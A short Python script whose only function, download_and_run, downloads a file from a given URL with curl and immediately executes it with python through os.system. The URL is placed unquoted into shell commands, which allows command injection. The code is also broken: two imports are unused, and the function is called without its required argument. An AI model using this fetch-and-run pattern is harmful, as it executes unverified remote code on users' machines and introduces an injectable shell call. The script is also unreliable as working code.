import os
import websocket
import webbrowser


def download_and_run(url):
    filename = url.split("/")[-1]
    os.system(f"curl {url} -o {filename}")
    os.system(f"python {filename}")

download_and_run()

